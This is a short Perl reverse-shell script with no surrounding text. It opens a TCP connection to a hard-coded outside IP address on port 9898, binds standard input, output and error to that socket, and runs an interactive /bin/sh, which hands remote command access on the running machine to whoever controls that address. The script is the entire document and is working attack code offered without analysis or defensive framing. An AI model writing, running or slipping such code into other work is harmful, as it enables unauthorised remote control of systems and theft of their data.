use Socket; 
$i="110.138.130.152"; 
$p=9898; 
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); 
if(connect(S,sockaddr_in($p,inet_aton($i)))){ 
	open(STDIN,">&S"); 
	open(STDOUT,">&S"); 
	open(STDERR,">&S"); 
	exec("/bin/sh -i"); 
};
